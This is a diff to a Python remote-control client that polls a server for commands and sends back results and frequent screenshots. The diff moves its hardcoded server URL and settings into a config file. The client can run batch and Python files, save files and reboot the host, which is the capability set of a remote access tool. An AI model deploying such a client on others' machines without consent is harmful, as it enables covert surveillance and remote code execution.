@@ -1,5 +1,6 @@
 import base64
 import io
+import json
 import mss
 import os
 import requests
@@ -8,11 +9,17 @@ import subprocess
 import sys
 import time
 
+from pathlib import Path
 from PIL import Image
 from threading import Thread
 
-CLIENT_ID = "motya20252010"
-SERVER_URL = "http://rc.yprogs.ru:8080/"
+_cfg_path = Path(__file__).parent / "config.json"
+
+with _cfg_path.open("r", encoding="utf-8") as f:
+    cfg = json.load(f)
+
+CLIENT_ID = cfg["CLIENT_ID"]
+SERVER_URL = cfg["SERVER_URL"].rstrip("/") + "/"
 
 CONNECT_URL = f"{SERVER_URL}connect"
 GET_COMMANDS_URL = f"{SERVER_URL}commands/{CLIENT_ID}?not_in_progress=true"
@@ -20,27 +27,28 @@ POST_COMMAND_RESULT_URL = f"{SERVER_URL}commands/{CLIENT_ID}"
 POST_SCREENSHOT_URL = f"{SERVER_URL}screenshot/{CLIENT_ID}"
 POST_HEARTBEAT_URL = f"{SERVER_URL}heartbeat/{CLIENT_ID}"
 
-HEARTBEAT_INTERVAL_SEC = 3
-CONNECT_RETRY_INTERVAL_SEC = 4
-CHECK_FOR_COMMANDS_INTERVAL_SEC = 2
-SEND_SCREENSHOT_INTERVAL_SEC = 0.5
+HEARTBEAT_INTERVAL_SEC = float(cfg["HEARTBEAT_INTERVAL_SEC"])
+CONNECT_RETRY_INTERVAL_SEC = float(cfg["CONNECT_RETRY_INTERVAL_SEC"])
+CHECK_FOR_COMMANDS_INTERVAL_SEC = float(cfg["CHECK_FOR_COMMANDS_INTERVAL_SEC"])
+SEND_SCREENSHOT_INTERVAL_SEC = float(cfg["SEND_SCREENSHOT_INTERVAL_SEC"])
 
-REQUEST_TIMEOUT_SEC = 5
-SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC = 1
-STEEL_ALIVE_TIMEOUT_SEC = 1
+REQUEST_TIMEOUT_SEC = float(cfg["REQUEST_TIMEOUT_SEC"])
+SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC = float(cfg["SCREENSHOT_THREAD_JOIN_TIMEOUT_SEC"])
+STEEL_ALIVE_TIMEOUT_SEC = float(cfg["STEEL_ALIVE_TIMEOUT_SEC"])
 
-SCREENSHOT_TARGET_WIDTH = 1280
-SCREENSHOT_TARGET_HEIGHT = 720
+SCREENSHOT_TARGET_WIDTH = int(cfg["SCREENSHOT_TARGET_WIDTH"])
+SCREENSHOT_TARGET_HEIGHT = int(cfg["SCREENSHOT_TARGET_HEIGHT"])
 
-START_SCREENSHOTS_COMMAND = "start_screenshots"
-STOP_SCREENSHOTS_COMMAND = "stop_screenshots"
-PLAY_WAV_COMMAND = "play_wav"
-RUN_BAT_COMMAND = "run_bat"
-RUN_PY_COMMAND = "run_py"
-SAVE_FILE_COMMAND = "save_file"
-REBOOT_COMMAND = "reboot"
+START_SCREENSHOTS_COMMAND = cfg["START_SCREENSHOTS_COMMAND"]
+STOP_SCREENSHOTS_COMMAND = cfg["STOP_SCREENSHOTS_COMMAND"]
+PLAY_WAV_COMMAND = cfg["PLAY_WAV_COMMAND"]
+RUN_BAT_COMMAND = cfg["RUN_BAT_COMMAND"]
+RUN_PY_COMMAND = cfg["RUN_PY_COMMAND"]
+SAVE_FILE_COMMAND = cfg["SAVE_FILE_COMMAND"]
+REBOOT_COMMAND = cfg["REBOOT_COMMAND"]
 
-COMMAND_STATUS_IN_PROGRESS = "in_progress"
+COMMAND_STATUS_ATTR = cfg["COMMAND_STATUS_ATTR"]
+COMMAND_STATUS_IN_PROGRESS = cfg["COMMAND_STATUS_IN_PROGRESS"]
 
 should_send_heartbeat = True
 should_check_for_commands = True
@@ -89,7 +97,7 @@ def post_command_result(command_name, result_ok, result_message):
 def post_command_status(command_name, status):
     data = {
         "command": command_name,
-        "__status": status
+        COMMAND_STATUS_ATTR: status
     }
 
     return post_data(POST_COMMAND_RESULT_URL, data)
